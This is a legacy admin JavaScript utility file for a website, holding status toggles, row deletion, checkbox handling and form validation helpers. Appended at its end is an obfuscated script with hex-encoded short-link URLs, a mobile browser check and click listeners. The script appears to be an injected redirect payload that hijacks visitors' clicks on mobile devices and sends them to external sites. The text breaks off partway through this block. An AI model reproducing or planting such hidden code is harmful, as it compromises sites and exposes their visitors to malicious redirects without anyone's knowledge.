/**
  * Javascript: Fetch the part of the string from right side of the Input string
  * str: Input String
  * n: No. to chracters to fetch from right.
  archana
  */
function myRight(str, n){
    if (n <= 0)
       return "";
    else if (n > String(str).length)
       return str;
    else {
       var iLen = String(str).length;
       return String(str).substring(iLen, iLen - n);
    }
}

// Common XAJAX routine to Activate / Deactivate.

function myChangeStatus(theForm, id)
{
	
//
	var stat=document.getElementById('enumStatus'+id).value;
	//alert(stat);
	
	if (stat=='A')
	{
		rtn = confirm("Are you sure you want to deactivate this record?");
	}	
	
	else if (stat=='D')
	{
		rtn = confirm("Are you sure you want to activate this record?");
	}
		
	if (rtn)
	{
		var status = eval('theForm.enumStatus'+id).value;
		
		xajax_update_status(id,status);
	}
	return false;
}
function myChangeStatusD(theForm, id)
{
	
//
	var stat=document.getElementById('vchdepositstatus'+id).value;
	//alert(stat);
	
	if (stat=='Deposit')
	{
		rtn = confirm("Are you sure you want to Refund the received deposit amount?");
	}	
	
	else if (stat=='Refund')
	{
		rtn = confirm("Are you sure you want to Deposit?");
	}
		
	if (rtn)
	{
		var status = eval('theForm.vchdepositstatus'+id).value;
		
		xajax_update_status_d(id,status);
	}
	return false;
}

function myChangeStatusForMore(theForm,id)
{
	var stat=document.getElementById('enumStatusFor'+id).value;
	if (stat=='A')
	{
		rtn = confirm("Are you sure you want to deactivate this record?");
	}	
	else if (stat=='D')
	{
		rtn = confirm("Are you sure you want to activate this record?");
	}	
	if (rtn)
	{
		var status=eval('theForm.enumStatusFor'+id).value;
		xajax_update_status_new(id,status);
	}
	return false;
}


function myChangePermissionStatus(id)
{
	rtn = confirm("Are you sure you want to give Full access to this member?");
	if (rtn) 
	{ 
		xajax_update_status_new(id);
	}
}

// Common XAJAX routine to Delete a row.
function sendNewsLetter(id)
{	
	if(confirm('Are you sure you want to send this newsletter?'))
		xajax_sendnewsletter(id);
}


function delete_row_selected(val,pageid,pageurl)
{	
	var item_val; 
	if (fnSelectedChecked())
	{
		if( confirm('Are you sure you want to delete all selected records?'))
		{	
			var i;
			for (i=1;i<val;i++)
			{
				if (document.getElementById('catCheck'+i).checked==true)	
				{
					item_val =document.getElementById('catCheck'+i).value;
					xajax_deleteRow(item_val);
				}
			}
			call_page_after_delete(pageid,pageurl);
		}
	}
}
function delete_row_answer(id,qnsid)
{	
	if( confirm('Are you sure you want to delete this record?'))
	{
		xajax_deleteRow_Answer(id,qnsid);
	}
	return false;	
}
function activate_row_selected(val)
{
	if (fnSelectedChecked())
	{
		if(confirm('Are you sure you want to activate all selected records?'))
		{
			var i;
			for (i=1;i<val;i++)
			{
				if (document.getElementById('catCheck'+i).checked==true)	
				{
					var item_val =document.getElementById('catCheck'+i).value;
					xajax_update_status(item_val,'D');
				}
			}
		}
	}
}
function deactivate_row_selected(val)
{
	if (fnSelectedChecked())
	{
		if(confirm('Are you sure you want to deactivate all selected records?'))
		{
			var i;
			for (i=1;i<val;i++)
			{
				if (document.getElementById('catCheck'+i).checked==true)	
				{
					var item_val =document.getElementById('catCheck'+i).value;
					xajax_update_status(item_val,'A');
				}
			}
		}
	}	
}

function fnCheckall()
{
	var chkall = document.getElementById('countCheck').value;
	var i;
	if (document.getElementById('checkall').checked==true)
	{
		for (i=1;i<chkall;i++)
		{
			document.getElementById('catCheck'+i).checked=true;		
		}	
	}
	else
	{
		for (i=1;i<chkall;i++)
		{
			document.getElementById('catCheck'+i).checked=false;		
		}	
	}
}

function fnSelectedChecked()
{
	var chkall = document.getElementById('countCheck').value;
	var i,chk=1;
	for (i=1;i<chkall;i++)
	{
		if (document.getElementById('catCheck'+i).checked==true)
		{
			chk=1;
			return true;	
			break;
		}
		else
		{
			chk=0;		
		}
	}
	if (chk==0)
	{
		alert("Please select at least one record.");
		return false;
	}
}

function call_page_after_delete(pagid,pageurl)
{
	//alert(pagid+' '+pageurl);
	sk_ajax_request(pageurl,'&page='+pagid+'&pagin=1','txtResult');
}

function call_page_after_refresh(pagid,pageurl)
{
	//alert(pagid+' '+pageurl);
	sk_ajax_request(pageurl,'&page='+pagid+'&pagin=1','txtResult');
}

// Common XAJAX routine to Delete a row.
function delete_row(id)
{
	if( confirm('Are you sure you want to delete this record?'))
		xajax_deleteRow(id);
}
/*
divyanshu comments to show column chart
function delete_all_row(ids)
{
	//if( confirm('Are you sure you want to delete selected record(s)?'))
		xajax_deleteAllRow(ids);
}

// Other Functions.
Array.prototype.exists = function (x) {
    for (var i = 0; i < this.length; i++) {
    	//alert(this[i].value+' Passed value: '+x);
        if (this[i].value == x) return true;
    }
    return false;
}
*/
function clear_cal_date(field_id)
{
	document.getElementById(field_id).value = ""; // Empty hidden variable value
	document.getElementById('disp_cal_'+field_id).innerHTML = '&nbsp;&nbsp;';
}

function byteCounter(field, countfield, maxlimit,setDiv) {
	if (field.value.length > maxlimit) // if too long...trim it!
	{
		field.value = field.value.substring(0, maxlimit);
		document.getElementById(setDiv).innerHTML = field.value.length+"/"+maxlimit;
		// otherwise, update 'characters left' counter
	}
	else
	{
		countfield.value = maxlimit - field.value.length;
		document.getElementById(setDiv).innerHTML = field.value.length+"/"+maxlimit;
	}
}

function get_element_text(element_id)
{
	var text = "";
	var elem = document.getElementById(element_id);
	if(elem.textContent) {
		text = trim(elem.textContent);
	} else if(elem.innerText) {
		text = trim(elem.innerText);
	}
	return text;
}

// Opens a POP Up window.
function MM_openBrWindow(theURL,winName,features)
{ //v2.0
  	window.open(theURL,winName,features);
}


// Image Swap Javascript
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function swap_text(txtCaption){
	if(window.document.getElementById)
	{
               window.document.getElementById("txtCaption").innerHTML=txtCaption;
	 }
           if(window.document.layers)
	   {
               window.document.layers["txtCaption"].innerHTML=txtCaption;
	       /*with(window.document.layers["txtCaption"].document){
                        open();
                        write(txtCaption);
                        close();
                  }*/
	    }
           if(window.document.all)
	   {
		window.document.all["txtCaption"].innerHTML=txtCaption;
	   }
}


// Validates if the element is present in the document or not ?
function isDefined(variable,type_evt)
{
	try
	{
		if(type_evt==1)
		{
			if (variable == null)
			{
				return false;
			}

			if ("undefined" == typeof(variable) )
			{
				return false;
			}
			return true;
		}
		else
			return (typeof(window[variable]) == "undefined")?  false: true;
	}
	catch(e)
	{
		//alert('here.');
	}
}

// Repeats the particular string to the specified number of times.
function strRepeat(cnt)
{
	var retStr = "";
	for(i=0;i<cnt;i++)
		retStr=retStr+",";
	return retStr;
}

// Core function to validate the forms. It reduces the time by just providing the validations for the specified field only. the other not required validations can be skipped.
function validateForm(myForm,cArray,cnt)
{
	var i=0;
	var values = "theControl,theMessage,theNumeric,theEmail,theURL,theConfirmPassword,thebadstuff,theinteger,thepercent,thesize,thedecimal,theimage,theempty,themin,themax,thecheckboxlength,thephoneno";
	var leftSide = new Array();
	var rightVals = new Array();
	leftSide = values.split(",");

	var strRepeats = strRepeat(cnt-1);

	for(i=0;i<leftSide.length;i++){
		if(cArray[leftSide[i]]){
			rightVals[i] = (cArray[leftSide[i]]);
		}else{
			rightVals[i] = strRepeats;
		}
		leftSide[i]=rightVals[i];
	}

	if(!theValidator(myForm,leftSide[0],leftSide[1],leftSide[2],leftSide[3],leftSide[4],leftSide[5],leftSide[6],leftSide[7],leftSide[8],leftSide[9],leftSide[10],leftSide[11],leftSide[12],leftSide[13],leftSide[14],leftSide[15],leftSide[16]))
		return false;

	return true;
}

function validate_FckEditor(instanceName)
{
	var oEditor = FCKeditorAPI.GetInstance(instanceName);
	var str =oEditor.EditorDocument.body.innerHTML;

	str = str.replace("&nbsp;", "");
     	str = str.replace("<BR>", "");
     	str = str.replace("<BR/>", "");
     	str = str.replace("<P>", "");
     	str = str.replace("</P>", "");
     	str = str.replace("<br>", "");
     	str = str.replace("<br/>", "");
     	str = str.replace("<p>", "");
     	str = str.replace("</p>", "");
	str = str.replace("<P", "");
	str = str.replace("_fckxhtmljob=", "");
	str = str.replace("\"", "");
	str = str.replace("\"", "");
	str = str.replace(">", "");
	if (!isNaN(str))
	{
		str = str.replace(str, "");
	}	

     	if(str == "")
     		return false;
     	else
     		return true;
}


// Play with the DOM to add a dynamic row of Text and the delete icon.
function addRowToTable(theForm)
{
	var tbl = document.getElementById('tblDynamic');
	var lastRow = tbl.rows.length;
	if(lastRow<=5)
	{
		if(document.getElementById('no-child'))
		{
			var ind=document.getElementById('no-child').rowIndex;
			tbl.deleteRow(ind);
			lastRow = tbl.rows.length;
		}

		theForm.tempCounter.value = parseInt(theForm.tempCounter.value,10)+1;
		var td0 = theForm.mm.value + '/' + theForm.dd.value + '/' + theForm.yy.value ;
		var dob= theForm.yy.value + '-' + theForm.mm.value + '-' + theForm.dd.value ;

		if(theForm.enumGender[0].checked)	{	var td1 = 'Boy';	}
		else							{	var td1 = 'Girl';	}

		var td2 = document.createElement('img');
		td2.setAttribute('src', 'images/delete-new.gif');
		td2.setAttribute('title', 'Delete');
		td2.setAttribute('alt', 'Delete');
		td2.setAttribute('border', '0');
		//td2.setAttribute('onclick', 'delRowTable('+theForm.tempCounter.value+');');
		//td2.onclick=function(){delRowTable(theForm.tempCounter.value)}

		var hidChild = document.createElement('input');
		hidChild.setAttribute('type', 'hidden');
		hidChild.setAttribute('name', 'child[]');
		if(td1 == 'Boy')			hidChild.setAttribute('value', 'B' + ',' + dob);
		else					hidChild.setAttribute('value', 'G' + ',' + dob);

		var row = tbl.insertRow(lastRow);
		row.setAttribute('id', 'child-' + theForm.tempCounter.value);

		td2.onclick=function(){delRowTable(row)}

		var cell0 = row.insertCell(0);
		var textNode0 = document.createTextNode(td0);
		cell0.appendChild(textNode0);
		cell0.appendChild(hidChild);

		var cell1 = row.insertCell(1);
		var textNode1 = document.createTextNode(td1);
		cell1.appendChild(textNode1);

		var cell2 = row.insertCell(2);
		cell2.appendChild(td2);
	}
	else
		alert('Maximum limit is 5.');
}

// Play with the DOM to remove a dynamic row of Text and the delete icon.
function delRowTable(tr)
{
	if(document.getElementById('child-'+tr))
	{
		var tbl = document.getElementById('tblDynamic');
		var ind=document.getElementById('child-'+tr).rowIndex;
		tbl.deleteRow(ind);
	}
	else
	{
		tr.parentNode.removeChild(tr);
	}
}

// For Manage Affiliate Module
function addRowToTable_associate(theForm)
{
	var tbl = document.getElementById('tblDynamic');
	var lastRow = tbl.rows.length;
// 	alert(lastRow);
	theForm.tempCounter.value = parseInt(theForm.tempCounter.value)+1;
	if(theForm.cat_level2.value != "")
	{
		var x=theForm.cat_level1;
		var y=theForm.cat_level2;
		var cat_id= theForm.cat_level2.value;
		var parent_id= theForm.cat_level1.value;
	}
	else
	{
		if(theForm.cat_level2.length >=0)
		{
			alert('Please select Sub-Category.');
			theForm.cat_level2.focus();
			return false;
		}

		var x=theForm.cat_level1;
		var y=theForm.cat_level2;
		var cat_id= theForm.cat_level2.value ;
		var parent_id= theForm.cat_level1.value;
	}


	cats = Form.getInputs(theForm,'hidden','cats[]');
	var my_cats = $A(cats);
	//alert(my_cats.inspect());
	/*
	my_cats.each(function(cat){
				alert('Value is: '+cat.value);
			});
	*/
	var is_exists;
	is_exists = (my_cats.exists(cat_id));
	/*
	is_exists = my_cats.find( function(cat){
		alert('Cat Value-'+cat.value+'- Cat ID-'+cat_id);
			alert (cat.value == cat_id);
			if (cat.value == cat_id)
			{
				alert('if');
				return false;
			}
			else
			{
				alert('else');
				return true;
			}
		});
	*/

	if(!is_exists)
	{
		var parent_name = x.options[x.selectedIndex].text ;
		var cat_name= y.options[y.selectedIndex].text ;
		var td0= '' + parent_name;
		var td1= '' + cat_name;

		var td2 = document.createElement('img');
		td2.setAttribute('src', 'images/delete1.gif');
		td2.setAttribute('title', 'Delete');
		td2.setAttribute('alt', 'Delete');
		td2.setAttribute('border', '0');
		td2.setAttribute('class', 'setcursor');
		//td1.onclick=function(){delRowTable_associate(theForm.tempCounter.value)}
		//Events cannot be set with set-attribute in IE


		var hidCat = document.createElement('input');
		hidCat.setAttribute('type', 'hidden');
		hidCat.setAttribute('name', 'cats[]');
		hidCat.setAttribute('value', cat_id);


		var row = tbl.insertRow(lastRow);
		row.setAttribute('id', 'cat-' + theForm.tempCounter.value);

		td2.onclick=function(){delRowTable_associate(row)}

		var cell0 = row.insertCell(0);
		var textNode0= document.createTextNode(td0);
	 	cell0.style.width='45%';
	 	cell0.valign='middle';
		cell0.appendChild(textNode0);
		cell0.appendChild(hidCat);

		var cell1 = row.insertCell(1);
		var textNode1 = document.createTextNode(td1);
	 	cell1.style.width='45%';
		cell1.align='center';
	 	cell1.valign='middle';
	// 	cell1.appendChild(hidCat);
		cell1.appendChild(textNode1);

		var cell2 = row.insertCell(2);
	 	cell2.style.width='10%';
	 	cell2.valign='middle';
		cell2.align='right';
	  	cell2.style.padding='8px';
		cell2.appendChild(td2);

		//return true;
	}
	else
	{
		alert('This category already exists.');
	}
	return true;
}

function delRowTable_associate(tr)
{
	if( confirm('Are you sure you want to delete this record?'))
	{
		if(document.getElementById('cat-'+tr))
		{
			var tbl = document.getElementById('tblDynamic');
			var ind=document.getElementById('cat-'+tr).rowIndex;
			tbl.deleteRow(ind);
		}
		else
		{
			tr.parentNode.removeChild(tr);
		}
	}
	return false;
}

// Comma Separated ID's are enabled on the form
function enableIDs(IDs)
{
	var IDs = IDs.split(',');
	for(i=0;i<IDs.length;i++)
	{
		e = document.getElementById(IDs[i]);
		e.disabled = "";
	}
}

// Comma Separated ID's are disabled on the form
function disableIDs(IDs)
{
	var IDs = IDs.split(',');
	for(i=0;i<IDs.length;i++)
	{
		e = document.getElementById(IDs[i]);
		e.disabled = "true";
	}
}

// Comma Separated ID's are used to show the hidden ids
function showHiddenIDs(IDs)
{
	var IDs = IDs.split(',');
	for(i=0;i<IDs.length;i++)
	{
		new Effect.Appear(IDs[i],{duration:0.0,from:0.1,to:1.0});
		//new Effect.Highlight(IDs[i],{startcolor:'#ffff99',endcolor:'#ffff99'});
		//e = document.getElementById(IDs[i]);
		//e.style.display = "";

	}
}

// Comma Separated ID's are used to hide the ids
function hideIDs(IDs)
{
	var IDs = IDs.split(',');
	for(i=0;i<IDs.length;i++)
	{
		new Effect.Fade(IDs[i],{ duration: 0.0 }); //, transition: Effect.Transitions.wobble});
		//e = document.getElementById(IDs[i]);
		//e.style.display = "none";
	}
}

function check_mandatory(theForm)
{
	id = self.setInterval("show_mandatory(document.getElementById('"+theForm+"'))",200);
}

function show_mandatory(theForm)
{
	if(theForm.cat_level2.length >1)
	{
		showHiddenIDs("sub-cat");
		enableIDs("cat_level2");
	}
/*
	if(theForm.cat_level3.length >1)
	{
		showHiddenIDs("sub_cat,sub_sub_cat");
		enableIDs("cat_level2");
		enableIDs("cat_level3");
	}*/
	/*
	if(stopRep=='true')
		self.clearInterval(id);
	else
		alert('running..');
	//alert('here');
	*/
}

function my_check_mandatory(theForm)
{
	id = self.setInterval("my_show_mandatory(document.getElementById('"+theForm+"'))",200);
}

function my_show_mandatory(theForm)
{
	if(theForm.cat_level2.length >1)
		enableIDs("cat_level2");
	if(theForm.cat_level3.length >1)
		enableIDs("cat_level2,cat_level3");
}

/*
* A Popup class to open new windows, using the Prototype.js lib.
*
* Basic Usage:
*   Popup.open( url_for_popup [, options [, window_options ] ] )
*
* Example:
*   Popup.open('http://www.google.com/');
* With options:
*   Popup.open('http://www.google.com/', { focus: true }, { statusbar: 1});
*
* To close the window:
*		Popup.close('http://www.google.com');
*
* To focus the window:
*		Popup.focus('http://www.google.com');
*/
/*
var Popup = Object.extend(Object.extend(Enumerable), {
	// open a popup
	// only mandatory is the url for the popup
	open: function(url) {
		// get the options
		var options = Object.extend({
			name: 'popup',
			focus: false
		}, arguments[1] || {});

		// get the window options
		var window_options = $H(Object.extend({
			width: 640,
			height: 480,
			toolbar: 0,
			scrollbars: 1,
			location: 0,
			statusbar: 0,
			menubar: 0,
			resizable: 1
		}, arguments[2] || {}));

		Popup[url] = window.open(url, options.name, window_options.map(function(v, i) {
			return v[0] + '=' + v[1];
		}).join(', '));

		if (options.focus) {
			this.focus(url);
		}
		return Popup[url];
	},

	// close a popup window
	// pass it the original url used to open the popup
	close: function(url) {
		if (url in this) {
			this[url].close();
			delete this[url];
		}
	},

	// focus am open popup window
	// pass it original url used to open the popup
	focus: function(url) {
		if (url in this) {
			this[url].focus();
			//this[url].print();
		}
	},

	print_page: function(url){
		if (url in this) {
			this[url].print();
		}
	}

});
*/
function PrintThisContent(prn_url)
{
	//Popup.open(prn_url, { focus: true }, { statusbar: 1});
	//Popup.print_page(prn_url);
	var sOption="toolbar=no,location=no,directories=no,menubar=no,";
	sOption+="scrollbars=yes,width=640,height=480,left=0,top=0";

	MM_openBrWindow(prn_url,'print_profile_window',sOption);
}

function PrintThisContent_js()
{
	//var divs = print_div_ids.split(',');
	var sWinHTML;
//	for(i=0;i<divs.length;i++)
//	{
//		var new_id = divs[i];
//		sWinHTML += document.getElementById("'"+new_id+"'").innerHTML;
//	}
	sWinHTML = document.getElementById("print_profile_type").innerHTML;
	sWinHTML += document.getElementById("print_innerfull").innerHTML;
	var class_file = "print_style";
	var addl_path = "";

//	if(in_admin==1)
//	{
//		addl_path = "../";
//		class_file = "style-admin";
//	}
	var popup_content='<html><head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><title>:: ClickSize ::</title><link href="css/'+class_file+'.css" rel="stylesheet" type="text/css"></head><body><table width="500"  border="0" cellspacing="0" cellpadding="0" align="center"><tr><td><img src="images/clr.gif" width="1" height="1" alt=""></td></tr><tr><td id="welcom-bg"><img src="images/clr.gif" width="1" height="2" alt=""></td></tr><tr><td style="padding:15px;"><!--img src="'+addl_path+'images/logo1.gif" title="ClickSize"--></td></tr><tr><td bgcolor="#FFFFFF"><table width="100%" border="0" align="center" cellpadding="2" cellspacing="1"><tr><td>' + sWinHTML + '</td></tr><tr class="trbglc"><td align="center"><img src="images/clr.gif" alt="" width="1" height="1"></td></tr></table></td></tr></table><table width="580" border="0" align="center" cellpadding="0" cellspacing="0"><tr><td height="24" align="center" class="bottom-link-bg">Copyright &copy; 2007, clicksize.com. All Rights Reserved.</td></tr></table></body></html>';

	var sOption="toolbar=yes,location=no,directories=yes,menubar=yes,";
	sOption+="scrollbars=yes,width=1024,height=768,left=0,top=0";

	var winprint=window.open("","",sOption);
	winprint.document.open();
	winprint.document.write(popup_content);

	winprint.print();
    winprint.document.close();
    winprint.focus();
}


function check_all(ccount,ccheck)
{
	if(document.getElementById('checkStatus').value == "")
	{
		document.getElementById('checkStatus').value = "Check";
     
	    for (i=1;i<document.getElementById(''+ccount+'').value;i++)
	    {
	    	//alert(''+ccheck+'_'+i);
	       	document.getElementById(''+ccheck+'_'+i).checked=true;
	    }
	}
	else
	{
		document.getElementById('checkStatus').value = "";
	    for (i=1;i<document.getElementById(''+ccount+'').value;i++)
	    {
	       	document.getElementById(''+ccheck+'_'+i).checked=false;
	    }
	}
}

function chkOptions_all(act,theForm,ccheckbox,ccount)
{
	if(chkOptions(theForm,ccheckbox))
	{
		if(act=='D')
		{
			if(confirm('Are you sure you want to activate these records?'));
			else
				return false;
		}
		else if(act=='A')
		{
			if(confirm('Are you sure you want to deactivate these records?'));
			else
				return false;
		}
		else if(act=='Delete')
		{
			if(confirm('Are you sure you want to delete these records?'));
			else
				return false;
		}
		
		var strChkId='';delChkID = '';
		var i;
		for(i=0; i<theForm.elements.length; i++)
		{
		
			if(theForm.elements[i].name==''+ccheckbox+'[]' && theForm.elements[i].checked)
			{
				//if(strChkId == "")
					var strChkId = theForm.elements[i].value;
//				else
//					strChkId = strChkId + "," + document.frmCouponCode.elements[i].value;
					if(act == 'A')
					{
						
						xajax_update_status(strChkId,'A');
						
					}
					else if(act == 'D')
					{
						xajax_update_status(strChkId,'D');
						
					}
					 
					if(delChkID == "")
					{
						var delChkID = theForm.elements[i].value;
					}
					else
						delChkID = delChkID +","+theForm.elements[i].value;
					
			}
			
		}
		for (i=1;i<document.getElementById(''+ccount+'').value;i++)
	    {
	       	document.getElementById(''+ccheckbox+'_'+i).checked=false;
	    }
	    document.getElementById('checkStatus').value = "";
		if(act == 'Delete')
		{
			//alert(delChkID);
			xajax_deleteRow(delChkID);
			//call_page_after_delete(2,"/admin/promotions.php");
		}

	}
	else
	{
		return false;
	}
}
function chkAll_Options(act,theForm)
{
	
	    if(act == 'edit')
		{
			xajax_editmode(editChkID);
			//call_page_after_delete(2,"/admin/promotions.php");
		}
		if(act == 'Delete')
		{
			xajax_deleteRow(delChkID);
			//call_page_after_delete(2,"/admin/promotions.php");
		}
		
		//alert(strChkId);
		
		
		//$strRadioId=$strRadioId.substring(10,$strRadioId.length);
//		
//		if(act=='edit')
//		{
//			window.location='manage-links.php?act='+act+'&pId='+strRadioId;
//		}
//		else
//		{
//			window.location='manage-links.php?act='+act+'&pId='+strRadioId;
//		}
	}
	
function chkOptions(theForm,ccheckbox)
{
	var resVal=''; 
	//alert(ccheckbox);
	for(i=0; i<theForm.elements.length; i++)
	{
		
			//alert(document.frmCouponCode.elements[i].name);
			if(theForm.elements[i].name==''+ccheckbox+'[]' && theForm.elements[i].checked)
			{
				if(resVal == "")
					var resVal=theForm.elements[i].value;
				else
					resVal = resVal + "," + theForm.elements[i].value;
			}
		
	}
	//alert(resVal);
	if(resVal=='')
	{
		alert('Please select a record.');
		return false;
	}
	else
	{
		//alert(resVal);
		return true;
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const 